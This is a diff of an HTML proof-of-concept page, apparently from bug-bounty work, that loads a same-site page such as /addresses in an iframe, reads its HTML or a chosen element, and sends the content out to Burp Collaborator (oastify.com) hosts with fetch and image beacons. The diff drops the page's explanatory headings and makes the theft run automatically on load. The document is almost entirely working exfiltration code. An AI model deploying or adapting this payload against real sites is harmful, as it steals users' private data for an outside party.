@@ -2,49 +2,36 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Title</title>
+    <title>POC</title>
 </head>
 <body>
-<h1> Hello that a POC page used by Bug Hunter G6G </h1>
-<h3> To modify the page on iframe you can modify the request param "path" in url </h3>
-<h3> To modify the element to extract you can modify the request param "extract_id" in url </h3>
-<h3> To send data on your server you can modify the request param "url" in url </h3>
-
-
 <iframe id="test" width="800" height="1000"></iframe>
-
 <script>
-
     const urlParams = new URLSearchParams(window.location.search);
-    let path = urlParams.get("path") ?? "addresses";
-    let url = urlParams.get("out") ?? "https://3z3cpb0eimnjuj4u6fezcqc9c0ir6iw6l.oastify.com";
-    let id = urlParams.get("extract_id");
-    let iframe = document.getElementById("test");
-    iframe.src = "/" + path;
+    const path = urlParams.get("path") ?? "/addresses";
+    const out = urlParams.get("out") ?? "https://oxpxnwyzg7l4s42f40ckabaualgc43vrk.oastify.com";
+    const extractId = urlParams.get("extract_id");
 
-    console.log("path used : " + path)
-    console.log("url used : " + url)
-    console.log("extract name  : " + extract)
+    const iframe = document.getElementById("test");
+    iframe.src = path.startsWith("http") ? path : "/" + path;
 
-    setTimeout(() => {
-        let extractData = document.getElementById("test").contentWindow.document
-        if (id) extractData= extractData.getElementById(extract)
+    const extract = () => {
+        try {
+            const doc = iframe.contentWindow.document;
+            const data = extractId ? doc.getElementById(extractId) : doc.documentElement;
+            const payload = encodeURIComponent(JSON.stringify({
+                html: data?.outerHTML?.slice(0, 3000),
+                src: iframe.src
+            }));
+            fetch(out + "/iframe-data?d=" + payload, { mode: "no-cors", keepalive: true });
+            new Image().src = out + "/iframe-img?d=" + payload;
+        } catch(e) {
+            new Image().src = out + "/iframe-err?e=" + encodeURIComponent(e.message);
+        }
+    };
 
-// REPLACE SERVER ADRESS TO SEND TO YOUR SERVER NOT MINE
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                html: extractData?.outerHTML
-            })
-        });
-
-        console.log(extractData?.outerText.toString() + ' Sended to :' + extract.toString());
-    }, 10000);
+    iframe.onload = extract;
+    iframe.onerror = () => new Image().src = out + "/iframe-load-err?src=" + encodeURIComponent(iframe.src);
 </script>
-
-
 </body>
 </html>
